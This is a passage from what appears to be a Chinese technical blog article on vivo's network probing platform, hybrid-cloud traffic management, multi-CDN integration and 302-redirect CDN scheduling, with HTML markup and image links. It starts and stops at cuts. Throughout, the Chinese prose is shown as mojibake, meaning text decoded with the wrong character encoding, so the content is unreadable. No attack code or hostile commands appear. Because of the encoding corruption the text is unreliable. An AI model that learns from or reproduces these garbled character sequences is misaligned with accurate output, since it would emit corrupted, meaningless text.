<p>åŒæ—¶ï¼Œæˆ‘ä»¬å¯¹æ‰§è¡Œæ‹¨æµ‹èŠ‚ç‚¹çš„è€—ç”µï¼Œç½‘ç»œç¯å¢ƒï¼Œæ‰§è¡Œç­–ç•¥ï¼Œé…ç½®ç®¡æ§éƒ½åšäº†ç²¾ç»†åŒ–ç®¡ç† ä¿éšœé‡‡é›†çš„æ‹¨æµ‹æ•°æ®ç¨³å®šã€å¯ä¿¡ã€å¯åˆ†æï¼Œå¯åº¦é‡ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eddd95261e924db6982dce0c23e31959~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=ImDW83PP4%2BDYtn8IOhlFww7MrIc%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h3 data-id="heading-6">2.5 vivoæ‹¨æµ‹èƒ½åŠ›ä»‹ç»-å¹³å°ä¾§</h3>
<p>åœ¨å¹³å°ä¾§ï¼Œæˆ‘ä»¬åŒæ ·å…·å¤‡ä»»åŠ¡ç®¡ç†ã€é…ç½®ç®¡ç†ã€èŠ‚ç‚¹ç®¡ç†å’Œå‘Šè­¦èƒ½åŠ›ã€‚å¯ä»¥å®ç°å¤šç»´åº¦çš„ä»»åŠ¡ä¸‹å‘ï¼Œæ¯”å¦‚å¯ä»¥æŒ‰å›½å®¶ã€çœä»½ã€åŸå¸‚ã€åœ°åŒºã€è¿è¥å•†ã€æœºå‹ï¼Œç½‘ç»œç­‰ç»´åº¦ä¸‹å‘ã€‚</p>
<p>åŒæ—¶ï¼Œæˆ‘ä»¬ä¹Ÿå…·å¤‡äº†åŠ«æŒï¼ŒCDNæ•…éšœç­‰åœºæ™¯çš„æ£€æµ‹å‘Šè­¦èƒ½åŠ›ã€ä»¥åŠå¼‚å¸¸å¿«ç…§ã€é“¾è·¯åˆ†æç­‰æ•…éšœåˆ†æèƒ½åŠ› ç¡®ä¿æ”¶é›†åˆ°çš„æ‹¨æµ‹æ•°æ®å¾—åˆ°å……åˆ†çš„åº”ç”¨ï¼ŒåŒæ—¶ç»è¿‡å¤§æ•°æ®åˆ†æå’ŒAIèƒ½åŠ›åŠ æŒï¼Œåšåˆ°ä¸šåŠ¡é—®é¢˜ ä¸€åˆ†é’Ÿå‘ç°ã€å³æ—¶å‘Šè­¦ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5b3dba861ff84b5287dc15f934c9c1ff~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=l43nowEDNcxYLVGrsqqW2Evnm4g%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><em>vivoæ‹¨æµ‹å¹³å°å…è´¹ä½“éªŒåœ°å€ï¼š</em><a href="https://link.juejin.cn?target=https%3A%2F%2Fdial.vivo.com.cn%2F" target="_blank" title="https://dial.vivo.com.cn/" ref="nofollow noopener noreferrer"><em>https://dial.vivo.com.cn</em></a></p>
<h3 data-id="heading-7">2.6 æ‹¨æµ‹å¦‚ä½•æ”¯æ’‘æ™ºèƒ½æµé‡è°ƒåº¦</h3>
<p>å¦‚æ­¤æµ·é‡çš„æ‹¨æµ‹æ•°æ®ï¼Œç©¶ç«Ÿæ˜¯å¦‚ä½•æ”¯æ’‘æµé‡è°ƒåº¦çš„å‘¢ï¼Ÿ</p>
<p>ä¸‹é¢è¿™å¼ å›¾æ¸…æ™°å±•ç¤ºäº†å…¶å·¥ä½œåŸç†ã€‚</p>
<p><strong>é¦–å…ˆï¼Œæ˜¯â€œè¾“å…¥â€ç¯èŠ‚ã€‚</strong></p>
<p>IPå…ƒæ•°æ®ç®¡ç†å¹³å°ä¼šå°†å…¬ç½‘æœåŠ¡IPä¿¡æ¯åŒæ­¥åˆ°æ‹¨æµ‹å¹³å°ï¼Œå…¶ä¸­IPå…ƒæ•°æ®åŒ…å«6å¤§å…³é”®ç»´åº¦ï¼š</p>
<ol>
<li>
<p>IPä¿¡æ¯</p>
</li>
<li>
<p>å½’å±è¿è¥</p>
</li>
<li>
<p>å½’å±ä¸šåŠ¡</p>
</li>
<li>
<p>å½’å±æœºæˆ¿</p>
</li>
<li>
<p>å½’å±é›†ç¾¤</p>
</li>
<li>
<p>å½’å±IDC</p>
</li>
</ol>
<p><strong>å…¶æ¬¡ï¼Œæ˜¯â€œæ‰§è¡Œâ€ç¯èŠ‚ã€‚</strong></p>
<p>è¿™äº›å¸¦æœ‰å…ƒæ•°æ®çš„æœåŠ¡å…¬ç½‘IPä¿¡æ¯ï¼Œä¼šç”Ÿæˆå…·ä½“çš„â€œIPä»»åŠ¡â€ï¼Œé€šè¿‡â€œä»»åŠ¡è°ƒåº¦â€ç³»ç»Ÿï¼Œä¸‹å‘ç»™æˆ‘ä»¬éå¸ƒå…¨çƒçš„â€œè¾¹ç¼˜æ¢æµ‹èŠ‚ç‚¹â€ï¼Œæ‰§è¡Œæ¢æµ‹ä»»åŠ¡ã€‚</p>
<p><strong>æ¥ç€ï¼Œæ˜¯æ•°æ®åˆ†æå¤„ç†ç¯èŠ‚ã€‚</strong></p>
<p>æ¢æµ‹ç»“æœæ•°æ®ä¼šé€šè¿‡ç»Ÿä¸€ç½‘å…³å®æ—¶å­˜å…¥æ—¶åºæ•°æ®åº“ä¸­ï¼Œå…¶ä¸­ã€ç»“æœæ•°æ®åŒ…å«å››å¤§å…³é”®æŒ‡æ ‡ï¼š</p>
<ol>
<li>
<p>ICMP Ping å¯ç”¨æ€§</p>
</li>
<li>
<p>TCP Ping å¯ç”¨æ€§</p>
</li>
<li>
<p>ICMP Ping æ—¶å»¶</p>
</li>
<li>
<p>TCP Ping æ—¶å»¶</p>
</li>
</ol>
<p>è¿™äº›æŒ‡æ ‡ï¼Œæœ€ç»ˆæ„æˆäº†æ™ºèƒ½è°ƒåº¦çš„æ ¸å¿ƒæ•°æ®åŸºç¡€ã€‚</p>
<p><strong>æœ€åï¼Œå°±æ˜¯æµé‡æ™ºèƒ½è°ƒåº¦çš„åº”ç”¨ã€‚</strong></p>
<p>æœ‰äº†è¿™äº›ç²¾å‡†ã€å®æ—¶çš„æ•°æ®ï¼Œæˆ‘ä»¬å°±èƒ½èµ‹èƒ½ä¸€ç³»åˆ—ä¸Šå±‚çš„æ™ºèƒ½è°ƒåº¦åœºæ™¯ï¼Œæ¯”å¦‚ï¼š</p>
<ul>
<li>
<p>**æ•…éšœå¿«é€Ÿæ¢å¤ï¼š**ä¸€æ—¦æ‹¨æµ‹å‘ç°æŸä¸ªIPä¸å¯ç”¨ï¼Œè°ƒåº¦ç³»ç»Ÿå¯ä»¥ç§’çº§å°†å®ƒåˆ‡æ¢èµ°ã€‚</p>
</li>
<li>
<p>**æ•…éšœç²¾å‡†å®šä½ï¼š**æˆ‘ä»¬å¯ä»¥å¿«é€Ÿå®šä½åˆ°é—®é¢˜å‡ºåœ¨å“ªä¸ªåœ°åŸŸã€å“ªä¸ªè¿è¥å•†ï¼Œä»¥åŠå“ªä¸ªçº¿è·¯ã€‚</p>
</li>
<li>
<p>**æµé‡å¼‚å¸¸æ£€æµ‹ï¼š**é€šè¿‡æŒç»­çš„æ€§èƒ½æ•°æ®å¯¹æ¯”åˆ†æï¼Œå‘ç°æ½œåœ¨çš„æµé‡æ”»å‡»å’Œè´¨é‡æ¶åŒ– é£é™©ã€‚</p>
</li>
<li>
<p>**æµé‡æ™ºèƒ½è°ƒåº¦ï¼š**åŸºäºè´¨é‡å’Œæˆæœ¬ç›®æ ‡ï¼Œç»“åˆä¸šåŠ¡åœºæ™¯ã€åŠ¨æ€è°ƒæ•´æµé‡åˆ†é…ã€‚</p>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8c9dcb605115464b9dcff1f70871bee1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=%2FW62RIPZHhNGabGuUHwjlicBxLw%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h2 data-id="heading-8">ä¸‰ã€èåˆæµé‡ç®¡ç†</h2>
<h3 data-id="heading-9">3.1 æŠ€æœ¯èƒŒæ™¯</h3>
<p>vivoé‡‡ç”¨äº†è‡ªå»ºç§æœ‰äº‘å’Œå…¬æœ‰äº‘ç»“åˆçš„æ··åˆäº‘æ¶æ„ã€‚ç”¨æˆ·çš„è®¿é—®æµé‡ï¼Œä¼šé€šè¿‡DNSã€CDNã€è´Ÿè½½å‡è¡¡ç­‰ä¸€ç³»åˆ—ç½‘ç»œåŸºç¡€è®¾æ–½ï¼Œæœ€ç»ˆåˆ°è¾¾æˆ‘ä»¬çš„ä¸šåŠ¡æœåŠ¡ã€‚</p>
<p>è¿™ä¸ªæ¶æ„éå¸¸å…¸å‹ï¼Œä½†å®ƒä¹Ÿç»™æˆ‘ä»¬å¸¦æ¥äº†<strong>äº”å¤§æ ¸å¿ƒæŒ‘æˆ˜</strong>ã€‚</p>
<ul>
<li>
<p>**å¤æ‚æ€§ï¼š**å¤šè¿è¥å•†ã€å¤šCDNã€å¤šæœºæˆ¿ï¼Œç®¡ç†éš¾åº¦å·¨å¤§ã€‚</p>
</li>
<li>
<p>**æˆæœ¬å‹åŠ›ï¼š**å¸¦å®½è´¹ç”¨ï¼Œç‰¹åˆ«æ˜¯çªå‘æµé‡å¸¦æ¥çš„é¢å¤–å¼€é”€ï¼Œéå¸¸é«˜æ˜‚ã€‚</p>
</li>
<li>
<p>**è´¨é‡æŒ‘æˆ˜ï¼š**ä»»ä½•ä¸€ä¸ªç¯èŠ‚çš„ç½‘ç»œæ³¢åŠ¨ï¼Œéƒ½ä¼šå½±å“ç”¨æˆ·ä½“éªŒã€‚</p>
</li>
<li>
<p>**å®‰å…¨é£é™©ï¼š**å†…éƒ¨ä¸»åŠ¨ä¸Šç½‘å’Œå¤–éƒ¨æ”»å‡»ï¼Œéƒ½æ˜¯æ½œåœ¨çš„å¨èƒã€‚</p>
</li>
<li>
<p>**è¿ç»´æ•ˆç‡ï¼š**ç¼ºä¹ç»Ÿä¸€è§†å›¾å’Œè‡ªåŠ¨åŒ–èƒ½åŠ›ï¼Œæ’éšœå’Œå˜æ›´æ“ä½œå°†éå¸¸è€—æ—¶ã€‚</p>
</li>
</ul>
<p>é¢å¯¹è¿™äº›é—®é¢˜ï¼Œæˆ‘ä»¬çš„ç›®æ ‡å¾ˆæ˜ç¡®ï¼šå°±æ˜¯è¦æ„å»ºä¸€ä¸ªæ™ºèƒ½ã€é«˜æ•ˆã€å®‰å…¨çš„ä¸€ä½“åŒ–è§£å†³æ–¹æ¡ˆï¼Œæœ€ç»ˆå®ç°é™æˆæœ¬ã€æè´¨é‡ã€å¼ºå®‰å…¨ã€ææ•ˆç‡ï¼</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/247fce4d43ae427796dc06984aadc583~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=nknX%2BOj48Ib%2F9HuNWxk4c8t1HpM%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>ä¸ºäº†å®ç°è¿™äº›ï¼Œå¹³å°è½åœ°ä¸ºä¸€ç³»åˆ—å…·ä½“çš„è§£å†³æ–¹æ¡ˆï¼Œæ¯”å¦‚ï¼šé€šè¿‡DNSåŸŸåè§£æã€CDNåŠ é€Ÿæ¥å…¥æ¥ç»Ÿä¸€æµé‡å…¥å£ï¼›é€šè¿‡302æ™ºèƒ½è°ƒåº¦ã€æœºæˆ¿å¸¦å®½è°ƒåº¦æ¥å®ç°æ™ºèƒ½å†³ç­–ï¼›é€šè¿‡WAFæ‹¦æˆªã€å¤–å‘æµé‡æ£€æµ‹æ¥ä¿éšœå®‰å…¨ï¼›å¹¶é€šè¿‡å…¨é“¾è·¯ç›‘æ§å’Œæ•…éšœé¢„æ¡ˆæ¥å®ç°è‡ªåŠ¨åŒ–è¿ç»´ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/76e621d11b5545f9b7841c216cad6969~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=Lc2kj5q%2BMlZdUIhjdjjFg6MQTp4%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h3 data-id="heading-10">3.2 å¹³å°å®è·µ</h3>
<p>é‚£ä¹ˆï¼Œæˆ‘ä»¬æ˜¯å¦‚ä½•åšçš„å‘¢ï¼Ÿ</p>
<p>ä¸‹é¢æ˜¯å¹³å°çš„æ•´ä½“æŠ€æœ¯æ¶æ„ï¼Œå®ƒæ˜¯ä¸€ä¸ªå…¸å‹çš„åˆ†å±‚æ¶æ„ã€‚</p>
<ul>
<li>
<p><strong>æœ€åº•å±‚</strong>æ˜¯<strong>ç½‘ç»œèµ„æº</strong>ï¼ŒåŒ…æ‹¬äº†æˆ‘ä»¬å¯¹æ¥çš„DNSã€CDNã€æœºæˆ¿ç½‘ç»œç­‰æ‰€æœ‰ä¾›åº”å•†ã€‚</p>
</li>
<li>
<p>å¾€ä¸Šæ˜¯<strong>æ•°æ®é‡‡é›†å±‚</strong>ï¼Œå®ƒä¼šä»æœºæˆ¿ã€CDNã€ä¸šåŠ¡åŸ‹ç‚¹ã€æ‹¨æµ‹ç³»ç»Ÿç­‰å„ä¸ªæºå¤´ï¼Œå…¨é¢åœ°é‡‡é›†æµé‡ã€æ—¥å¿—å’Œç›‘æ§æŒ‡æ ‡æ•°æ®ã€‚</p>
</li>
<li>
<p>æ•°æ®ä¹‹ä¸Šï¼Œæ˜¯<strong>æ•°æ®å¤„ç†ä¸åˆ†æå±‚</strong>ï¼Œæˆ‘ä»¬ä½¿ç”¨å¤§æ•°æ®å¹³å°å¯¹æ•°æ®è¿›è¡Œå®æ—¶å’Œç¦»çº¿å¤„ç†ï¼Œå¹¶åˆ©ç”¨è°ƒåº¦å’Œæ£€æµ‹ç®—æ³•ï¼Œæ¥æŒ–æ˜æ•°æ®èƒŒåçš„ä»·å€¼ã€‚</p>
</li>
<li>
<p>æ¶æ„çš„æ ¸å¿ƒæ˜¯<strong>æ§åˆ¶ä¸æ‰§è¡Œå±‚</strong>ï¼Œå®ƒé€šè¿‡APIç½‘å…³å’Œè‡ªåŠ¨åŒ–ç¼–æ’èƒ½åŠ›ï¼Œå»å®é™…åœ°é…ç½®å’Œè°ƒåº¦åº•å±‚çš„ç½‘ç»œèµ„æºã€‚</p>
</li>
<li>
<p>æœ€ä¸Šå±‚æ˜¯<strong>å±•ç°ä¸äº¤äº’å±‚</strong>ï¼Œé€šè¿‡ä¸€ä¸ªç»Ÿä¸€çš„ç®¡ç†é—¨æˆ·ï¼Œé¢å‘ä¸šåŠ¡å’Œè¿ç»´äººå‘˜ï¼Œæä¾›æ¥å…¥ã€ç®¡æ§ã€æŠ¥è¡¨ç­‰ä¸€ç³»åˆ—æœåŠ¡ã€‚</p>
</li>
</ul>
<p>é€šè¿‡è¿™ä¸ªæ¶æ„ï¼Œæˆ‘ä»¬å°†å¤æ‚çš„æµé‡ç®¡ç†å·¥ä½œï¼Œå¹³å°åŒ–ã€ç³»ç»ŸåŒ–äº†ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/269211f9db6749f5b852a1f424b594df~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=JIJTbg8uOga54kaUG%2FBSAZhx%2Buo%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h4 data-id="heading-11">3.2.1 å¤šCDNç»Ÿä¸€æ¥å…¥çº³ç®¡</h4>
<p>æˆ‘ä»¬æ·±å…¥åˆ°å…·ä½“çš„å®è·µåœºæ™¯ã€‚</p>
<p>é¦–å…ˆæ˜¯<strong>CDNçš„æ²»ç†</strong>ã€‚</p>
<p>æˆ‘ä»¬æ‰“é€ çš„â€œèåˆCDNâ€å¹³å°ï¼Œæ ¸å¿ƒä»·å€¼ä½“ç°åœ¨å…­ä¸ªæ–¹é¢ï¼š</p>
<ul>
<li>
<p>**é…ç½®èåˆï¼š**ç»Ÿä¸€äº†ä¸åŒå‚å•†çš„é…ç½®æ ‡å‡†ï¼Œå¤§å¤§æå‡äº†ç®¡ç†æ•ˆç‡ã€‚</p>
</li>
<li>
<p>**æµé‡è°ƒåº¦ï¼š**æ”¯æŒå¤šç§ç­–ç•¥ï¼Œè®©è°ƒåº¦æ—¢ç²¾å‡†åˆçµæ´»ã€‚</p>
</li>
<li>
<p>**æ•°æ®èåˆï¼š**åœ¨ä¸€ä¸ªå¹³å°å°±èƒ½çœ‹åˆ°æ‰€æœ‰å‚å•†çš„æ•°æ®æŒ‡æ ‡ã€‚</p>
</li>
<li>
<p>**æˆæœ¬ä¼˜åŒ–ï¼š**é€šè¿‡ä¸€ç³»åˆ—è¿è¥æ‰‹æ®µï¼Œæˆ‘ä»¬æˆåŠŸå°†æˆæœ¬é™ä½äº†30%ã€‚</p>
</li>
<li>
<p>**ç§’çº§å®¹ç¾ï¼š**åŸºäºå…¨ç½‘æ‹¨æµ‹ç‚¹çš„è´¨é‡æ„ŸçŸ¥ï¼Œä¸€æ—¦å‘ç”Ÿæ•…éšœï¼Œå¯ä»¥è‡ªåŠ¨è°ƒåº¦ï¼Œå®ç°ç§’çº§å®¹ç¾ã€‚</p>
</li>
<li>
<p>**æ™ºèƒ½è¿ç»´ï¼š**åŒæ ·åŸºäºæ‹¨æµ‹èŠ‚ç‚¹ï¼Œå¯ä»¥æ™ºèƒ½åœ°è¿›è¡Œæ•…éšœçš„æ ¹å› å®šä½ã€‚</p>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b50d7933b19747f0ba6c60a316fc8411~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=82NUvxu3EerHuoqh7wPUaqAC8f0%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h4 data-id="heading-12">3.2.2 èåˆCDNäº§å“æ¶æ„</h4>
<p>ä¸‹é¢è¿™å¼ æ¶æ„å›¾å±•ç¤ºäº†æˆ‘ä»¬å¦‚ä½•å®ç°è¿™äº›ä»·å€¼ã€‚å¤§å®¶å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬é€šè¿‡ä¸€ä¸ªâ€œèåˆCDNç®¡ç†å¹³å°â€ï¼ŒæŠŠå…¨çƒä¸»æµCDNå‚å•†çš„APIéƒ½æ¥å…¥è¿›æ¥ï¼Œå±è”½äº†åº•å±‚çš„å·®å¼‚ã€‚</p>
<p>å¯¹äºä¸šåŠ¡æ–¹æ¥è¯´ï¼Œä»–ä»¬åªéœ€è¦é€šè¿‡æˆ‘ä»¬ç»Ÿä¸€çš„æ§åˆ¶å°æˆ–OpenAPIè¿›è¡Œæ“ä½œã€‚åŒæ—¶ï¼Œå¹³å°é›†æˆäº†æˆ‘ä»¬çš„ç«¯ä¾§è´¨é‡åŸ‹ç‚¹ã€æ™ºèƒ½è§£æã€302æ™ºèƒ½è°ƒåº¦ç­‰æ ¸å¿ƒèƒ½åŠ›ï¼Œå½¢æˆäº†ä¸€ä¸ªå¼ºå¤§çš„è°ƒåº¦ä¸­å¿ƒï¼Œä¸ºç”¨æˆ·æä¾›æœ€ä¼˜çš„åŠ é€Ÿä½“éªŒã€‚</p>
<p>åœ¨èåˆCDNä¸­ï¼Œ302æ™ºèƒ½è°ƒåº¦æ˜¯æˆ‘ä»¬æœ€æ ¸å¿ƒã€æœ€æœ‰ä»·å€¼çš„èƒ½åŠ›ä¹‹ä¸€ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8877ebdbdecc497f8e000ca84f6c31ee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=sOv0JUkT5Hd%2FfZjhOgs%2BAH0mUuE%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å¦‚å›¾ï¼Œå³ä½¿æ˜¯åœ¨åŒä¸€ä¸ªåœ°åŒºï¼Œä¸åŒçš„CDNå‚å•†ï¼Œåœ¨åŒä¸€æ—¶é—´çš„ä¸‹è½½é€Ÿåº¦ï¼Œæ˜¯ä¸ä¸€æ ·çš„ã€‚è“è‰²çš„çº¿å¯èƒ½åœ¨æŸä¸ªå°æ—¶æœ€å¿«ï¼Œä½†ä¸‹ä¸€ä¸ªå°æ—¶ï¼Œä¹Ÿè®¸ç»¿è‰²çš„çº¿å°±åè¶…äº†ã€‚</p>
<p>è¿™å°±å¸¦æ¥ä¸€ä¸ªæ ¸å¿ƒé—®é¢˜ï¼šæˆ‘ä»¬å¦‚ä½•ä¿è¯æˆ‘ä»¬çš„ç”¨æˆ·ï¼Œæ€»èƒ½ç”¨åˆ°å½“ä¸‹é‚£ä¸ªæœ€å¿«çš„CDNå‘¢ï¼ŸåŒæ—¶ï¼Œå½“æŸä¸ªå‚å•†å‡ºç°æ•…éšœæ—¶ï¼Œæˆ‘ä»¬åˆå¦‚ä½•å¿«é€Ÿåœ°æŠŠç”¨æˆ·åˆ‡æ¢èµ°ï¼Œå®ç°å®¹ç¾å‘¢ï¼Ÿè¿™å°±æ˜¯302æ™ºèƒ½è°ƒåº¦è¦è§£å†³çš„é—®é¢˜ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b727443cd8334ee0aac886f60beb0be6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=7lQaA0B1CGAzYJmp0Vzq73V8tmA%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h4 data-id="heading-13">3.2.3 302æ™ºèƒ½è°ƒåº¦</h4>
<p>ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬è®¾è®¡äº†è¿™å¥—æŠ€æœ¯æ–¹æ¡ˆã€‚å®ƒéå¸¸å·§å¦™ï¼Œä¸»è¦åˆ†ä¸ºå››æ­¥ï¼š</p>
<ul>
<li>
<p><strong>ç¬¬ä¸€æ­¥ï¼Œå®¢æˆ·ç«¯</strong>ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„ä¸šåŠ¡æœåŠ¡ç«¯ï¼Œåœ¨å“åº”ç”¨æˆ·è¯·æ±‚æ—¶ï¼Œå®ƒä¸ä¼šç›´æ¥è¿”å›ä¸€ä¸ªå†™æ­»çš„ä¸‹è½½åœ°å€ã€‚</p>
</li>
<li>
<p>**ç¬¬äºŒæ­¥ï¼Œ**å®ƒä¼šå…ˆå‘æˆ‘ä»¬çš„â€œ302è°ƒåº¦æœåŠ¡â€å‘èµ·ä¸€æ¬¡è¯·æ±‚ï¼Œé—®ä¸€ä¸ªé—®é¢˜ï¼šâ€œç°åœ¨å“ªä¸ªCDNæœ€å¿«ï¼Ÿâ€</p>
</li>
<li>
<p><strong>ç¬¬ä¸‰æ­¥ï¼Œæˆ‘ä»¬çš„è°ƒåº¦æœåŠ¡</strong>ï¼Œä¼šæ ¹æ®æµ·é‡çš„åŸ‹ç‚¹æ•°æ®ï¼Œé€šè¿‡æ™ºèƒ½ç®—æ³•è¿›è¡Œå®æ—¶è®¡ç®—ï¼Œç„¶åç«‹åˆ»å‘Šè¯‰ä¸šåŠ¡æœåŠ¡ç«¯ä¸€ä¸ªæœ€ä¼˜çš„å‚å•†åŸŸåã€‚</p>
</li>
<li>
<p>**ç¬¬å››æ­¥ï¼Œ**ä¸šåŠ¡æœåŠ¡ç«¯æ‹¿åˆ°è¿™ä¸ªæœ€ä¼˜åŸŸååï¼Œå†é€šè¿‡302è·³è½¬çš„æ–¹å¼ï¼ŒæŠŠç”¨æˆ·å¼•å¯¼è¿‡å»ã€‚</p>
</li>
</ul>
<p>æ•´ä¸ªè¿‡ç¨‹å¯¹ç”¨æˆ·æ˜¯å®Œå…¨é€æ˜çš„ï¼Œä½†æˆ‘ä»¬ç¡®ä¿äº†ç”¨æˆ·çš„æ¯ä¸€æ¬¡ä¸‹è½½ï¼Œèµ°çš„éƒ½æ˜¯å½“ä¸‹æœ€ä¼˜çš„è·¯å¾„ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d3aa51e8813b49a5b5d03e601f9d74df~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=LFEjE8Knc5h4XXJcc9Z1CGPFxts%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>è¿™å¥—æ–¹æ¡ˆçš„èƒŒåï¼Œæ˜¯ä¸€ä¸ªå¼ºå¤§çš„æŠ€æœ¯æ¶æ„åœ¨æ”¯æ’‘ã€‚ å¤§å®¶å¯ä»¥çœ‹åˆ°ï¼Œå®ƒåŒ…å«äº†å®Œæ•´çš„æŒ‡æ ‡æ•°æ®é‡‡é›†å¤„ç†å±‚å’Œè°ƒåº¦æ‰§è¡Œå±‚ã€‚</p>
<p>æˆ‘ä»¬é€šè¿‡ETLã€Druidç­‰å¤§æ•°æ®æŠ€æœ¯ï¼Œå¯¹æµ·é‡çš„ä¸šåŠ¡æŒ‡æ ‡æ•°æ®è¿›è¡Œå®æ—¶å¤„ç†ã€‚ åœ¨æ§åˆ¶å±‚ï¼Œæˆ‘ä»¬æœ‰çµæ´»çš„è°ƒåº¦ç­–ç•¥ç®¡ç†å’Œå¤šé‡è°ƒåº¦ç®—æ³•ã€‚</p>
<p>åœ¨è°ƒåº¦æ‰§è¡Œå±‚ï¼Œæˆ‘ä»¬é€šè¿‡ç»Ÿä¸€çš„ç½‘å…³ï¼Œä¸ºå•†åº—ã€æ¸¸æˆã€ç³»ç»Ÿå‡çº§ç­‰å…«åå¤šä¸ªä¸šåŠ¡åœºæ™¯æä¾›æœåŠ¡ã€‚</p>
<p>æ•´ä¸ªæ¶æ„çš„è®¾è®¡ï¼Œæ ¸å¿ƒå°±æ˜¯ä¸ºäº†ä¿è¯å››ç‚¹ï¼š<strong>ç²¾ç»†åŒ–æ§åˆ¶</strong>ã€<strong>æ•…éšœå¿«é€Ÿåˆ‡æ¢</strong>ã€<strong>å®æ—¶æ€§ä¸åŠ¨æ€é€‚åº”</strong>ï¼Œä»¥åŠ<strong>çµæ´»å¯æ‰©å±•</strong>ã€‚</p>
<p>æ­£æ˜¯è¿™äº›ï¼Œæ‰è®©æˆ‘ä»¬çš„è°ƒåº¦æœåŠ¡æ—¢å¿«åˆå‡†ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ba0c8ec6139d473da78389a333efea7e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=RetECY7U9NkR76JpwH%2BSi1lrXJc%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æœ€ç»ˆå¸¦æ¥äº†ä»€ä¹ˆæ ·çš„æ•ˆæœå‘¢ï¼Ÿ</p>
<ul>
<li>
<p>é¦–å…ˆæ˜¯<strong>æ€§èƒ½</strong>ï¼šæˆ‘ä»¬çš„æœåŠ¡ç«¯P99å“åº”æ—¶é—´åšåˆ°äº†å°äº2æ¯«ç§’ï¼è¿™å¯¹ç”¨æˆ·æ¥è¯´æ˜¯å®Œå…¨æ— æ„Ÿçš„ã€‚åŒæ—¶ï¼Œé…ç½®å˜æ›´å¯ä»¥ç§’çº§ç”Ÿæ•ˆï¼Œå®ç°äº†çœŸæ­£çš„å®æ—¶ã€‚</p>
</li>
<li>
<p>å…¶æ¬¡æ˜¯<strong>è§„æ¨¡</strong>ï¼šç›®å‰æ¯å¤©çš„è°ƒåº¦æ‰§è¡Œæ¬¡æ•°ï¼Œè¶…è¿‡äº†60äº¿æ¬¡ï¼è¦†ç›–äº†æˆ‘ä»¬80å¤šä¸ªæ ¸å¿ƒä¸šåŠ¡åœºæ™¯ã€‚</p>
</li>
<li>
